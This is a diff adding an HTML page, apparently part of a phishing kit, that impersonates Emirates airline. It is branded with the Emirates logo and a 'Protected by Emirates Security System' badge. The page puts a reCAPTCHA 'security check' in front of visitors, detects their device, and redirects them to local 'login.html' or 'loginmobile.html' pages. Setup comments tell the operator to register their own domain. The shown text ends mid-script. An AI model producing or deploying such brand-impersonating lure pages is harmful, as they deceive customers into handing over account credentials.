@@ -1,0 +1,1513 @@
+<!DOCTYPE html>
+<html lang="en" class="en" dir="ltr">
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Security Verification - Emirates</title>
+    <style>
+/* Reset and base styles */
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+}
+
+body {
+  background-color: #f5f5f5;
+  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+  min-height: 100vh;
+  -webkit-text-size-adjust: 100%;
+  -moz-text-size-adjust: 100%;
+  text-size-adjust: 100%;
+}
+
+/* FIXED HEADER CSS - MATCHING SCREENSHOT */
+.main-login-navigation {
+    position: relative;
+    display: block;
+    line-height: 0;
+    background-color: #333;
+    width: 100%;
+    height: 80px;
+    margin: 0;
+    padding: 0;
+}
+
+.e-container.main-login-navigation__container {
+    max-width: 100%;
+    width: 100%;
+    margin: 0 auto;
+    padding: 0;
+    height: 100%;
+}
+
+.main-login-navigation__content {
+    display: flex;
+    justify-content: flex-end;
+    align-items: center;
+    height: 100%;
+    margin: 0 auto;
+    padding: 0 40px;
+    position: relative;
+    max-width: 1200px;
+}
+
+.login-brand-logo {
+    align-items: center;
+    height: 80px;
+    padding: 20px 0;
+    background-color: #d41d28;
+    display: flex;
+    justify-content: center;
+    width: 300px;
+}
+
+.login-brand-logo__image {
+    width: auto;
+    filter: brightness(0) invert(1);
+    height: 40px;
+    max-width: 250px;
+}
+
+/* Remove unused header button styles */
+.header-buttons,
+.header-buttons__item,
+.main-login-navigation__login-link,
+.main-login-navigation__link-text {
+    display: none;
+}
+
+/* Remove old header styles */
+.main-login-navigation__burger,
+.main-login-navigation__burger-item,
+.main-login-navigation__login-wrapper {
+    display: none;
+}
+
+/* OTP card styles - Modified for Captcha */
+.captcha-card {
+    margin-top: 50px;
+    border: 1px solid #e0e0e0;
+    border-radius: 8px;
+    padding: 40px;
+    background-color: #fff;
+    box-shadow: 0 2px 4px rgba(0,0,0,0.05);
+    max-width: 500px;
+    margin-left: auto;
+    margin-right: auto;
+    text-align: center;
+}
+
+.captcha-card__expand {
+    width: 100%;
+}
+
+.captcha-card--section {
+    width: 100%;
+}
+
+.captcha-card__title-name {
+    font-size: 24px;
+    font-weight: 600;
+    color: #333;
+    margin-bottom: 10px;
+}
+
+.captcha-card__description {
+    font-size: 16px;
+    color: #666;
+    margin-bottom: 30px;
+    line-height: 1.5;
+    max-width: 400px;
+    margin-left: auto;
+    margin-right: auto;
+}
+
+/* Security badge */
+.security-badge {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 10px;
+    background: rgba(0, 150, 255, 0.1);
+    padding: 12px 20px;
+    border-radius: 10px;
+    margin-bottom: 25px;
+    border: 1px solid rgba(0, 150, 255, 0.3);
+    max-width: 300px;
+    margin-left: auto;
+    margin-right: auto;
+}
+
+.security-badge i {
+    font-size: 20px;
+    color: #0066cc;
+}
+
+/* Google reCAPTCHA container */
+.g-recaptcha-container {
+    margin: 30px 0;
+    display: flex;
+    justify-content: center;
+    min-height: 78px;
+    position: relative;
+    width: 100%;
+}
+
+/* recaptcha styling */
+.g-recaptcha {
+    transform: scale(1);
+    transform-origin: 0 0;
+}
+
+/* IMPORTANT: reCAPTCHA responsive fix */
+#captcha-widget {
+    width: 100% !important;
+    display: flex;
+    justify-content: center;
+}
+
+/* Button styles - MATCHING Emirates style */
+.call-to-action {
+    background-color: #d41d28;
+    color: white;
+    border: none;
+    border-radius: 4px;
+    font-size: 16px;
+    font-weight: 600;
+    padding: 16px 24px;
+    width: 100%;
+    cursor: pointer;
+    transition: all 0.2s ease;
+    display: block;
+    margin: 32px auto 0;
+    max-width: 300px;
+}
+
+.call-to-action:hover {
+    background-color: #b9151c;
+    transform: translateY(-1px);
+    box-shadow: 0 4px 12px rgba(212, 29, 40, 0.3);
+}
+
+.call-to-action:active {
+    transform: translateY(0);
+}
+
+.call-to-action:disabled {
+    background-color: #cccccc;
+    cursor: not-allowed;
+    transform: none;
+    box-shadow: none;
+}
+
+.call-to-action:disabled:hover {
+    background-color: #cccccc;
+    transform: none;
+}
+
+.call-to-action--middle {
+    display: block;
+    margin: 32px auto 0;
+}
+
+/* Single button container */
+.button-container {
+    margin-top: 32px;
+    text-align: center;
+}
+
+/* Container styles */
+.e-container {
+    max-width: 1200px;
+    margin: 0 auto;
+    padding: 0 20px;
+}
+
+.e-container--separator {
+    margin-bottom: 24px;
+}
+
+/* Security icon */
+.security-icon-large {
+    display: block;
+    text-align: center;
+    margin-bottom: 24px;
+}
+
+.security-icon-large i {
+    font-size: 80px;
+    color: #d41d28;
+    animation: pulse 2s infinite;
+}
+
+@keyframes pulse {
+    0% { transform: scale(1); }
+    50% { transform: scale(1.05); }
+    100% { transform: scale(1); }
+}
+
+/* Message styles */
+.message {
+    padding: 15px;
+    border-radius: 10px;
+    margin-top: 20px;
+    text-align: center;
+    display: none;
+    animation: fadeIn 0.3s ease-out;
+}
+
+@keyframes fadeIn {
+    from { opacity: 0; }
+    to { opacity: 1; }
+}
+
+.message.success {
+    background: rgba(76, 175, 80, 0.2);
+    border: 1px solid #4caf50;
+    display: block;
+}
+
+.message.error {
+    background: rgba(244, 67, 54, 0.2);
+    border: 1px solid #f44336;
+    display: block;
+}
+
+/* Loading spinner */
+.loading-spinner {
+    display: inline-block;
+    width: 20px;
+    height: 20px;
+    border: 3px solid rgba(255, 255, 255, 0.3);
+    border-radius: 50%;
+    border-top-color: white;
+    animation: spin 1s ease-in-out infinite;
+    margin-right: 10px;
+}
+
+@keyframes spin {
+    to { transform: rotate(360deg); }
+}
+
+/* Footer */
+.footer {
+    text-align: center;
+    margin-top: 40px;
+    padding-top: 20px;
+    border-top: 1px solid rgba(0, 0, 0, 0.1);
+    font-size: 12px;
+    color: #666;
+    max-width: 500px;
+    margin-left: auto;
+    margin-right: auto;
+}
+
+.footer a {
+    color: #d41d28;
+    text-decoration: none;
+    font-weight: 500;
+}
+
+.footer a:hover {
+    text-decoration: underline;
+}
+
+/* Instructions */
+.instructions {
+    background: rgba(0, 0, 0, 0.03);
+    border-radius: 8px;
+    padding: 15px;
+    margin: 20px 0;
+    font-size: 14px;
+    color: #555;
+    text-align: left;
+}
+
+.instructions ul {
+    padding-left: 20px;
+    margin: 10px 0;
+}
+
+.instructions li {
+    margin-bottom: 8px;
+}
+
+/* Domain warning (for testing) */
+.domain-warning {
+    background: #fff3cd;
+    border: 1px solid #ffeaa7;
+    border-radius: 4px;
+    padding: 10px;
+    margin: 10px 0;
+    font-size: 12px;
+    color: #856404;
+    display: none;
+}
+
+.domain-warning.show {
+    display: block;
+}
+
+.domain-warning code {
+    background: #f8f9fa;
+    padding: 2px 4px;
+    border-radius: 3px;
+    font-family: monospace;
+}
+
+/* ========== MOBILE RESPONSIVE STYLES ========== */
+@media (max-width: 768px) {
+    /* Base mobile adjustments */
+    html {
+        font-size: 16px;
+    }
+    
+    body {
+        font-size: 16px;
+        -webkit-font-smoothing: antialiased;
+    }
+    
+    /* Header adjustments */
+    .main-login-navigation {
+        height: 60px;
+    }
+    
+    .login-brand-logo {
+        height: 60px;
+        padding: 10px 0;
+        width: 250px;
+    }
+    
+    .login-brand-logo__image {
+        height: 35px;
+        width: auto;
+        max-width: 200px;
+    }
+    
+    .main-login-navigation__content {
+        padding: 0 20px;
+        justify-content: center;
+    }
+    
+    /* Container adjustments */
+    .e-container {
+        padding: 0 16px;
+        width: 100%;
+    }
+    
+    .e-container--separator {
+        margin-bottom: 16px;
+    }
+    
+    /* Captcha Card */
+    .captcha-card {
+        padding: 24px 20px;
+        margin: 30px 0;
+        border-radius: 8px;
+        max-width: 100%;
+        width: 100%;
+        box-shadow: 0 4px 12px rgba(0,0,0,0.08);
+    }
+    
+    .captcha-card__title-name {
+        font-size: 20px;
+        margin-bottom: 12px;
+        line-height: 1.3;
+    }
+    
+    .captcha-card__description {
+        font-size: 15px;
+        margin-bottom: 25px;
+        padding: 0;
+        line-height: 1.4;
+    }
+    
+    /* Security icon */
+    .security-icon-large i {
+        font-size: 70px;
+    }
+    
+    /* Google reCAPTCHA adjustments - IMPORTANT FOR MOBILE */
+    .g-recaptcha-container {
+        transform: scale(0.95);
+        transform-origin: center;
+        overflow: hidden;
+        width: 100%;
+        display: flex;
+        justify-content: center;
+    }
+    
+    /* Button adjustments */
+    .call-to-action {
+        padding: 18px 24px;
+        font-size: 17px;
+        margin-top: 28px;
+        max-width: 100%;
+        border-radius: 6px;
+        font-weight: 600;
+        height: 56px;
+    }
+    
+    .button-container {
+        margin-top: 28px;
+    }
+    
+    .footer {
+        font-size: 11px;
+        margin-top: 30px;
+    }
+}
+
+@media (max-width: 480px) {
+    /* Small mobile adjustments */
+    html {
+        font-size: 15px;
+    }
+    
+    /* Header adjustments */
+    .main-login-navigation {
+        height: 56px;
+    }
+    
+    .login-brand-logo {
+        height: 56px;
+        padding: 8px 0;
+        width: 220px;
+    }
+    
+    .login-brand-logo__image {
+        height: 32px;
+    }
+    
+    .main-login-navigation__content {
+        padding: 0 16px;
+    }
+    
+    /* Container adjustments */
+    .e-container {
+        padding: 0 12px;
+    }
+    
+    /* Captcha Card */
+    .captcha-card {
+        padding: 20px 16px;
+        margin: 20px 0;
+        border-radius: 6px;
+    }
+    
+    .captcha-card__title-name {
+        font-size: 18px;
+        margin-bottom: 10px;
+    }
+    
+    .captcha-card__description {
+        font-size: 14px;
+        margin-bottom: 20px;
+        line-height: 1.4;
+    }
+    
+    /* Security icon */
+    .security-icon-large i {
+        font-size: 60px;
+    }
+    
+    /* Google reCAPTCHA adjustments for small screens */
+    .g-recaptcha-container {
+        transform: scale(0.9);
+        transform-origin: center;
+        margin: 20px 0;
+    }
+    
+    /* Button adjustments */
+    .call-to-action {
+        padding: 16px 20px;
+        font-size: 16px;
+        margin-top: 24px;
+        height: 52px;
+    }
+    
+    .footer {
+        font-size: 11px;
+        margin-top: 30px;
+    }
+}
+
+@media (max-width: 360px) {
+    /* Extra small screens */
+    html {
+        font-size: 14px;
+    }
+    
+    .main-login-navigation {
+        height: 52px;
+    }
+    
+    .login-brand-logo {
+        height: 52px;
+        width: 200px;
+    }
+    
+    .login-brand-logo__image {
+        height: 30px;
+    }
+    
+    .captcha-card {
+        padding: 18px 14px;
+        margin: 15px 0;
+    }
+    
+    .captcha-card__title-name {
+        font-size: 17px;
+    }
+    
+    .captcha-card__description {
+        font-size: 13px;
+        margin-bottom: 18px;
+    }
+    
+    .security-icon-large i {
+        font-size: 56px;
+        margin-bottom: 16px;
+    }
+    
+    /* Google reCAPTCHA adjustments for very small screens */
+    .g-recaptcha-container {
+        transform: scale(0.8);
+        transform-origin: center;
+    }
+    
+    .call-to-action {
+        padding: 14px 18px;
+        font-size: 15px;
+        margin-top: 20px;
+        height: 48px;
+    }
+}
+
+/* Ensure proper spacing for mobile */
+@media (max-width: 768px) {
+    main {
+        padding-bottom: 40px;
+        min-height: calc(100vh - 60px);
+    }
+    
+    .captcha-card {
+        box-shadow: 0 4px 12px rgba(0,0,0,0.08);
+    }
+    
+    /* Make sure everything is touch-friendly */
+    button,
+    a {
+        min-height: 44px;
+        min-width: 44px;
+    }
+}
+
+/* Mobile landscape optimization */
+@media (max-width: 768px) and (orientation: landscape) {
+    .captcha-card {
+        padding: 20px;
+        margin: 10px 0;
+        max-height: 90vh;
+        overflow-y: auto;
+    }
+    
+    .security-icon-large i {
+        font-size: 50px;
+        margin-bottom: 16px;
+    }
+    
+    .captcha-card__title-name {
+        font-size: 18px;
+        margin-bottom: 8px;
+    }
+    
+    .captcha-card__description {
+        font-size: 13px;
+        margin-bottom: 16px;
+    }
+    
+    .g-recaptcha-container {
+        transform: scale(0.8);
+    }
+    
+    .call-to-action {
+        padding: 12px 16px;
+        font-size: 15px;
+        margin-top: 20px;
+        height: 46px;
+    }
+    
+    .footer {
+        margin-top: 20px;
+        padding-top: 15px;
+    }
+}
+
+/* Prevent text from being too small */
+@media (max-width: 768px) {
+    body {
+        -webkit-text-size-adjust: none;
+        text-size-adjust: none;
+    }
+}
+
+/* Dark mode support */
+@media (prefers-color-scheme: dark) {
+    body {
+        background-color: #121212;
+    }
+    
+    .captcha-card {
+        background-color: #1e1e1e;
+        border-color: #333;
+        color: #fff;
+    }
+    
+    .captcha-card__title-name {
+        color: #fff;
+    }
+    
+    .captcha-card__description {
+        color: #ccc;
+    }
+    
+    .security-badge {
+        background: rgba(0, 150, 255, 0.2);
+        border-color: rgba(0, 150, 255, 0.4);
+    }
+    
+    .footer {
+        color: #aaa;
+        border-top-color: #333;
+    }
+    
+    .instructions {
+        background: rgba(255, 255, 255, 0.05);
+        color: #ccc;
+    }
+}
+</style>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <!-- Google reCAPTCHA API -->
+    <script src="https://www.google.com/recaptcha/api.js?onload=onRecaptchaLoad&render=explicit" async defer></script>
+</head>
+<body>
+    <header class="main-login-navigation" data-auto="header">
+        <div class="e-container main-login-navigation__container">
+            <div class="main-login-navigation__content">
+                <a href="https://www.emirates.com/" class="login-brand-logo">
+                    <img alt="Emirates logo" class="login-brand-logo__image" src="https://c.ekstatic.net/ecl/logos/emirates/emirates-logo-horizontal.svg?h=nMiqF1sXP0LwuM-vCquofw">
+                </a>
+            </div>
+        </div>
+    </header>
+
+    <main id="maincontent" class="no-swipe">
+        <div class="domain-warning" id="domain-warning">
+            <strong><i class="fas fa-exclamation-triangle"></i> Testing Mode:</strong> 
+            reCAPTCHA requires domain registration. Current domain: <code id="current-domain">localhost</code>
+            <br><small>For testing, use <code>localhost</code> or register your domain in Google reCAPTCHA admin.</small>
+        </div>
+        
+        <div class="e-container e-container--separator">
+            <div class="captcha-card">
+                <div class="captcha-card__expand">
+                    <div class="captcha-card--section">
+                        <fieldset>
+                            <legend>Security Verification</legend>
+                            
+                            <!-- Security Icon -->
+                            <div class="security-icon-large">
+                                <i class="fas fa-shield-alt"></i>
+                            </div>
+                            
+                            <h2 class="captcha-card__title-name">Complete Security Check</h2>
+                            <p class="captcha-card__description">
+                                To ensure the security of your account and protect against automated access, 
+                                please complete the security verification below.
+                            </p>
+                            
+                            <div class="security-badge">
+                                <i class="fas fa-lock"></i>
+                                <span>Protected by Emirates Security System</span>
+                            </div>
+                            
+                            <!-- Instructions for users -->
+                            <div class="instructions">
+                                <p><strong>How to complete:</strong></p>
+                                <ul>
+                                    <li>Check the box "I'm not a robot"</li>
+                                    <li>Complete any image challenges if they appear</li>
+                                    <li>Click "Continue to Login" once verified</li>
+                                </ul>
+                            </div>
+                            
+                            <!-- Google reCAPTCHA v2 Container -->
+                            <div class="g-recaptcha-container">
+                                <div id="captcha-widget"></div>
+                            </div>
+                            
+                            <!-- Hidden verification token -->
+                            <input type="hidden" id="captcha-token" value="">
+                            
+                            <!-- Success/Error Messages -->
+                            <div class="message success" id="success-message" style="display: none;">
+                                <i class="fas fa-check-circle"></i> Verification successful! Redirecting...
+                            </div>
+                            
+                            <div class="message error" id="error-message" style="display: none;">
+                                <i class="fas fa-exclamation-circle"></i> 
+                                <span id="error-text">Please complete the security check.</span>
+                            </div>
+                            
+                            <!-- Continue Button -->
+                            <div class="button-container">
+                                <button id="btnContinue" aria-disabled="true" type="button" 
+                                        class="focusout-button call-to-action call-to-action--middle" disabled>
+                                    <i class="fas fa-arrow-right"></i> Continue to Login
+                                </button>
+                            </div>
+                            
+                            <!-- Alternative options -->
+                            <div class="footer">
+                                <p>Having trouble with the security check?</p>
+                                <p>
+                                    <a href="javascript:void(0)" onclick="refreshCaptcha()">
+                                        <i class="fas fa-redo"></i> Refresh Security Check
+                                    </a>
+                                    &nbsp;|&nbsp;
+                                    <a href="javascript:void(0)" onclick="showHelp()">
+                                        <i class="fas fa-question-circle"></i> Help
+                                    </a>
+                                </p>
+                                <p style="margin-top: 15px; font-size: 11px; opacity: 0.7;">
+                                    <i class="fas fa-info-circle"></i> 
+                                    This verification helps prevent unauthorized access to Emirates systems.
+                                </p>
+                            </div>
+                        </fieldset>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <script>
+        // Configuration with YOUR reCAPTCHA site key
+        const CONFIG = {
+            // FOR TESTING: You can use this test key that works on all domains
+            // captchaSiteKey: '6LeIxAcTAAAAAJcZVRqyHh71UMIEGNQ_MXjiZKhI',
+            
+            // YOUR ACTUAL SITE KEY (Register your domain in Google reCAPTCHA admin)
+            captchaSiteKey: '6LdyED4sAAAAAIoKzYhXX1QG8_sMdrPtpcPuAXA0',
+            
+            verificationToken: 'emirates_secure_token_' + new Date().getFullYear(),
+            sessionTimeout: 30 * 60 * 1000, // 30 minutes
+            maxAttempts: 5,
+            deviceDetection: true,
+            debugMode: true, // Set to true for testing
+            // Set to true if you want to bypass domain check (for testing only)
+            bypassDomainCheck: false
+        };
+
+        // State management
+        let captchaState = {
+            isVerified: false,
+            attempts: 0,
+            sessionId: generateSessionId(),
+            deviceType: detectDevice(),
+            userAgent: navigator.userAgent,
+            timestamp: Date.now(),
+            lastAttempt: null,
+            widgetId: null,
+            domainError: false
+        };
+
+        // Initialize on page load
+        document.addEventListener('DOMContentLoaded', function() {
+            // Show current domain for debugging
+            document.getElementById('current-domain').textContent = window.location.hostname || 'localhost';
+            
+            // Check if we're on localhost or a registered domain
+            checkDomainValidity();
+            
+            if (CONFIG.debugMode) {
+                console.log('Captcha page loaded with config:', CONFIG);
+                console.log('Device detected:', captchaState.deviceType);
+                console.log('Current domain:', window.location.hostname);
+            }
+            
+            checkExistingSession();
+            detectSuspiciousActivity();
+            setupEventListeners();
+            
+            // Log initialization
+            logSecurityEvent('page_loaded', {
+                device: captchaState.deviceType,
+                viewport: `${window.innerWidth}x${window.innerHeight}`,
+                session: captchaState.sessionId,
+                domain: window.location.hostname
+            });
+        });
+
+        // Check domain validity
+        function checkDomainValidity() {
+            const currentDomain = window.location.hostname;
+            const isLocalhost = currentDomain === 'localhost' || currentDomain === '127.0.0.1';
+            
+            if (!isLocalhost && !CONFIG.bypassDomainCheck) {
+                // Show warning for non-localhost domains
+                document.getElementById('domain-warning').classList.add('show');
+                captchaState.domainError = true;
+                
+                logSecurityEvent('domain_warning', {
+                    domain: currentDomain,
+                    message: 'Domain may not be registered in reCAPTCHA console'
+                });
+            }
+        }
+
+        // reCAPTCHA load callback
+        window.onRecaptchaLoad = function() {
+            console.log('reCAPTCHA loaded successfully');
+            
+            // Check if reCAPTCHA is available
+            if (typeof grecaptcha === 'undefined') {
+                console.error('reCAPTCHA not loaded properly');
+                showError('Security service failed to load. Please refresh the page.');
+                return;
+            }
+            
+            try {
+                // Render reCAPTCHA widget
+                captchaState.widgetId = grecaptcha.render('captcha-widget', {
+                    'sitekey': CONFIG.captchaSiteKey,
+                    'callback': onCaptchaSuccess,
+                    'expired-callback': onCaptchaExpired,
+                    'error-callback': onCaptchaError,
+                    'theme': 'light',
+                    'size': 'normal',
+                    'tabindex': 0 // Make it accessible
+                });
+                
+                console.log('reCAPTCHA widget rendered with ID:', captchaState.widgetId);
+                
+                // Log successful reCAPTCHA load
+                logSecurityEvent('recaptcha_loaded', {
+                    widgetId: captchaState.widgetId,
+                    siteKey: CONFIG.captchaSiteKey.substring(0, 10) + '...',
+                    domain: window.location.hostname
+                });
+                
+            } catch (error) {
+                console.error('Error rendering reCAPTCHA:', error);
+                showError('Unable to load security check. Please try again.');
+                
+                logSecurityEvent('recaptcha_render_error', {
+                    error: error.message,
+                    domain: window.location.hostname
+                });
+                
+                // If domain error, show specific message
+                if (error.message && error.message.includes('domain')) {
+                    showError('Domain not authorized for security check. Please use localhost for testing.');
+                    captchaState.domainError = true;
+                }
+            }
+        };
+
+        // Generate session ID
+        function generateSessionId() {
+            const timestamp = Date.now();
+            const random = Math.random().toString(36).substr(2, 9);
+            return `emirates_${timestamp}_${random}`;
+        }
+
+        // Detect device type
+        function detectDevice() {
+            const userAgent = navigator.userAgent.toLowerCase();
+            const screenWidth = window.innerWidth;
+            
+            // Check for mobile
+            const isMobile = /mobile|android|iphone|ipad|ipod|windows phone|iemobile|blackberry/i.test(userAgent);
+            
+            // Check for tablet
+            const isTablet = /tablet|ipad|android(?!.*mobile)/i.test(userAgent) || 
+                           (screenWidth >= 600 && screenWidth <= 1024);
+            
+            // Determine device type
+            if (isMobile) return 'mobile';
+            if (isTablet) return 'tablet';
+            
+            // Check screen size for desktop
+            if (screenWidth >= 1024) return 'desktop';
+            if (screenWidth >= 768) return 'tablet';
+            
+            return 'mobile';
+        }
+
+        // Check for existing valid session
+        function checkExistingSession() {
+            try {
+                const saved = sessionStorage.getItem('emirates_captcha_verification');
+                if (saved) {
+                    const data = JSON.parse(saved);
+                    
+                    // Check if session is valid
+                    const isValid = data.verified && 
+                                   data.token === CONFIG.verificationToken && 
+                                   data.expiry > Date.now() &&
+                                   data.sessionId;
+                    
+                    if (isValid) {
+                        if (CONFIG.debugMode) {
+                            console.log('Existing valid session found, redirecting...');
+                        }
+                        
+                        // Session is valid, redirect immediately
+                        redirectToLogin();
+                        return true;
+                    } else {
+                        // Clear invalid session
+                        sessionStorage.removeItem('emirates_captcha_verification');
+                        sessionStorage.removeItem('emirates_security_verified');
+                    }
+                }
+            } catch (e) {
+                console.error('Error checking session:', e);
+            }
+            return false;
+        }
+
+        // reCAPTCHA success callback
+        window.onCaptchaSuccess = function(token) {
+            if (CONFIG.debugMode) {
+                console.log('reCAPTCHA success, token received (first 20 chars):', token.substring(0, 20) + '...');
+            }
+            
+            // Clear domain error flag
+            captchaState.domainError = false;
+            
+            // Store the token
+            document.getElementById('captcha-token').value = token;
+            
+            // Enable continue button
+            const btn = document.getElementById('btnContinue');
+            btn.disabled = false;
+            btn.innerHTML = '<i class="fas fa-arrow-right"></i> Continue to Login';
+            btn.setAttribute('aria-disabled', 'false');
+            
+            // Hide any error message
+            hideError();
+            
+            // Mark as verified
+            captchaState.isVerified = true;
+            captchaState.attempts = 0;
+            
+            // Log success
+            logSecurityEvent('recaptcha_success', {
+                device: captchaState.deviceType,
+                session: captchaState.sessionId,
+                tokenLength: token.length,
+                domain: window.location.hostname
+            });
+            
+            // Auto-focus the continue button for accessibility
+            setTimeout(() => {
+                btn.focus();
+            }, 100);
+        };
+
+        // reCAPTCHA expired callback
+        window.onCaptchaExpired = function() {
+            if (CONFIG.debugMode) {
+                console.log('reCAPTCHA expired');
+            }
+            
+            // Disable continue button
+            const btn = document.getElementById('btnContinue');
+            btn.disabled = true;
+            btn.setAttribute('aria-disabled', 'true');
+            btn.innerHTML = '<i class="fas fa-arrow-right"></i> Continue to Login';
+            
+            // Reset token
+            document.getElementById('captcha-token').value = '';
+            
+            // Show error
+            showError('Security check expired. Please complete it again.');
+            
+            // Reset state
+            captchaState.isVerified = false;
+            
+            // Log expiration
+            logSecurityEvent('recaptcha_expired', {
+                device: captchaState.deviceType,
+                session: captchaState.sessionId
+            });
+            
+            // Auto-refresh the widget
+            setTimeout(() => {
+                if (captchaState.widgetId !== null) {
+                    grecaptcha.reset(captchaState.widgetId);
+                }
+            }, 2000);
+        };
+
+        // reCAPTCHA error callback
+        window.onCaptchaError = function() {
+            console.error('reCAPTCHA error occurred');
+            
+            // Disable continue button
+            const btn = document.getElementById('btnContinue');
+            btn.disabled = true;
+            btn.setAttribute('aria-disabled', 'true');
+            
+            // Show specific error for domain issues
+            if (captchaState.domainError) {
+                showError('Security check domain error. Please register this domain in Google reCAPTCHA console.');
+            } else {
+                showError('Security check failed. Please refresh the page and try again.');
+            }
+            
+            // Log error
+            logSecurityEvent('recaptcha_error', {
+                device: captchaState.deviceType,
+                session: captchaState.sessionId,
+                error: 'reCAPTCHA widget error',
+                domainError: captchaState.domainError
+            });
+            
+            // Offer reload option
+            setTimeout(() => {
+                if (confirm('There was an error with the security check. Would you like to reload the page?')) {
+                    location.reload();
+                }
+            }, 3000);
+        };
+
+        // Refresh captcha
+        function refreshCaptcha() {
+            if (CONFIG.debugMode) {
+                console.log('Refreshing captcha...');
+            }
+            
+            if (captchaState.widgetId !== null && typeof grecaptcha !== 'undefined') {
+                grecaptcha.reset(captchaState.widgetId);
+                
+                // Reset UI
+                const btn = document.getElementById('btnContinue');
+                btn.disabled = true;
+                btn.setAttribute('aria-disabled', 'true');
+                btn.innerHTML = '<i class="fas fa-arrow-right"></i> Continue to Login';
+                document.getElementById('captcha-token').value = '';
+                
+                // Hide errors
+                hideError();
+                
+                // Reset state
+                captchaState.isVerified = false;
+                captchaState.domainError = false;
+                
+                // Log refresh
+                logSecurityEvent('recaptcha_refresh', {
+                    device: captchaState.deviceType,
+                    session: captchaState.sessionId
+                });
+            } else {
+                // If widget not loaded, reload page
+                location.reload();
+            }
+        }
+
+        // Show help information
+        function showHelp() {
+            const helpMessage = "For the security check to work properly:\n\n" +
+                              "1. Make sure JavaScript is enabled in your browser\n" +
+                              "2. Check if any ad-blockers are interfering\n" +
+                              "3. Try using a different browser\n" +
+                              "4. Ensure you have a stable internet connection\n" +
+                              "5. If testing, use localhost or register your domain\n\n" +
+                              "If problems persist, try clearing your browser cache and cookies.";
+            
+            alert(helpMessage);
+        }
+
+        // Continue button handler
+        document.getElementById('btnContinue').addEventListener('click', function() {
+            if (!captchaState.isVerified) {
+                showError('Please complete the security check first.');
+                return;
+            }
+            
+            const token = document.getElementById('captcha-token').value;
+            if (!token || token.length < 10) {
+                showError('Security verification missing. Please complete the check again.');
+                refreshCaptcha();
+                return;
+            }
+            
+            // Verify the captcha
+            verifyCaptchaAndContinue(token);
+        });
+
+        // Verify captcha and proceed
+        function verifyCaptchaAndContinue(token) {
+            if (CONFIG.debugMode) {
+                console.log('Verifying captcha token...');
+            }
+            
+            const btn = document.getElementById('btnContinue');
+            const originalText = btn.innerHTML;
+            
+            // Show loading
+            btn.disabled = true;
+            btn.setAttribute('aria-disabled', 'true');
+            btn.innerHTML = '<div class="loading-spinner"></div> Verifying...';
+            
+            // Simulate server verification
+            setTimeout(() => {
+                // Check if token looks valid (basic validation)
+                const isValid = token && token.length > 50 && token.startsWith('03');
+                
+                if (isValid) {
+                    onVerificationSuccess(token);
+                } else {
+                    onVerificationFailed();
+                }
+                
+                // Restore button
+                btn.innerHTML = originalText;
+                btn.disabled = !captchaState.isVerified;
+                btn.setAttribute('aria-disabled', captchaState.isVerified ? 'false' : 'true');
+            }, 1000);
+        }
+
+        // On verification success
+        function onVerificationSuccess(token) {
+            if (CONFIG.debugMode) {
+                console.log('Captcha verification successful');
+            }
+            
+            // Save verification to session storage
+            saveVerificationData(token);
+            
+            // Show success message
+            showSuccess();
+            
+            // Log success
+            logSecurityEvent('verification_complete', {
+                device: captchaState.deviceType,
+                session: captchaState.sessionId,
+                tokenLength: token.length
+            });
+            
+            // Redirect after delay
+            setTimeout(() => {
+                redirectToLogin();
+            }, 1500);
+        }
+
+        // On verification failed
+        function onVerificationFailed() {
+            if (CONFIG.debugMode) {
+                console.log('Captcha verification failed');
+            }
+            
+            captchaState.attempts++;
+            captchaState.lastAttempt = Date.now();
+            
+            if (captchaState.attempts >= CONFIG.maxAttempts) {
+                // Block excessive attempts
+                showError('Too many failed attempts. Please try again in 10 minutes.');
+                document.getElementById('btnContinue').disabled = true;
+                document.getElementById('btnContinue').setAttribute('aria-disabled', 'true');
+                
+                // Auto-refresh after 10 minutes
+                setTimeout(() => {
+                    location.reload();
+                }, 10 * 60 * 1000);
+                
+                logSecurityEvent('verification_blocked', {
+                    attempts: captchaState.attempts,
+                    device: captchaState.deviceType,
+                    session: captchaState.sessionId
+                });
+            } else {
+                // Show error and refresh captcha
+                const remaining = CONFIG.maxAttempts - captchaState.attempts;
+                showError(`Verification failed. ${remaining} attempt${remaining !== 1 ? 's' : ''} remaining.`);
+                refreshCaptcha();
+                
+                logSecurityEvent('verification_failed', {
+                    attempt: captchaState.attempts,
+                    device: captchaState.deviceType,
+                    session: captchaState.sessionId
+                });
+            }
+        }
+
+        // Save verification data
+        function saveVerificationData(token) {
+            const verificationData = {
+                verified: true,
+                token: CONFIG.verificationToken,
+                captchaToken: token,
+                sessionId: captchaState.sessionId,
+                device: captchaState.deviceType,
+                timestamp: Date.now(),
+                expiry: Date.now() + CONFIG.sessionTimeout
+            };
+            
+            try {
+                sessionStorage.setItem('emirates_captcha_verification', JSON.stringify(verificationData));
+                localStorage.setItem('emirates_last_captcha', Date.now().toString());
+                
+                // Set a simple flag for quick checking
+                sessionStorage.setItem('emirates_security_verified', 'true');
+                
+                if (CONFIG.debugMode) {
+                    console.log('Verification data saved to session storage');
+                }
+            } catch (e) {
+                console.error('Failed to save verification data:', e);
+                showError('Could not save verification. Please try again.');
+            }
+        }
+
+        // Redirect to appropriate login page
+        function redirectToLogin() {
+            const deviceType = captchaState.deviceType;
+            let redirectPage;
+            
+            // Determine which page to redirect to based on device
+            if (deviceType === 'mobile') {
+                redirectPage = 'loginmobile.html';
+            } else if (deviceType === 'tablet') {
+                redirectPage = 'login.html'; // Tablets use desktop version
+            } else {
+                redirectPage = 'login.html';
+            }
+            
+            // Add verification parameters
+            const params = new URLSearchParams({
+                verified: CONFIG.verificationToken,
+                session: captchaState.sessionId,
+                device: deviceType,
+                ts: Date.now(),
+                ref: 'captcha'
+            });
+            
+            const redirectUrl = `${redirectPage}?${params.toString()}`;
+            
+            if (CONFIG.debugMode) {
+                console.log('Redirecting to:', redirectPage);
+                console.log('Redirect URL:', redirectUrl);
+            }
+            
+            window.location.href = redirectUrl;
+        }
+
+        // Show success message
+        function showSuccess() {
+            const successDiv = document.getElementById('success-message');
+            const errorDiv = document.getElementById('error-message');
+            
+            errorDiv.style.display = 'none';
+            successDiv.style.display = 'block';
+        }
+
+        // Show error message
